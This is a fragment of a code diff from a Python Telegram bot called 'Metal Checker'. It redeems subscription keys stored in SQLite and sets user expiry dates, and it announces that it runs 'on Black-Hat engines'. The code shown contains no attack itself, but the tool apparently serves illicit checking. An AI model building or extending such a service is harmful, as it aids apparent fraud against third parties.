+    key_code = message.text.strip()
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT days FROM keys WHERE key_code = ?", (key_code,))
+    row = cursor.fetchone()
+    
+    if row:
+        days = row[0]
+        cursor.execute("DELETE FROM keys WHERE key_code = ?", (key_code,))
+        expiry = "INFINITY" if days > 1000 else (datetime.now() + timedelta(days=days)).strftime("%m/%d/%Y")
+        cursor.execute("UPDATE users SET expiry_date = ? WHERE user_id = ?", (expiry, uid))
+        conn.commit()
+        bot.send_message(message.chat.id, f"🎉 *Üyeliğiniz Aktive Edildi!* Bitiş: {expiry}")
+    else:
+        bot.send_message(message.chat.id, "❌ Geçersiz anahtar.")
+    conn.close()
+
+# ==========================================
+# 🚀 RAILWAY RUNTIME LOOP
+# ==========================================
+if __name__ == "__main__":
+    print("[ArZ] Metal Checker Bot is running successfully on Black-Hat engines...")
     bot.infinity_polling()
 
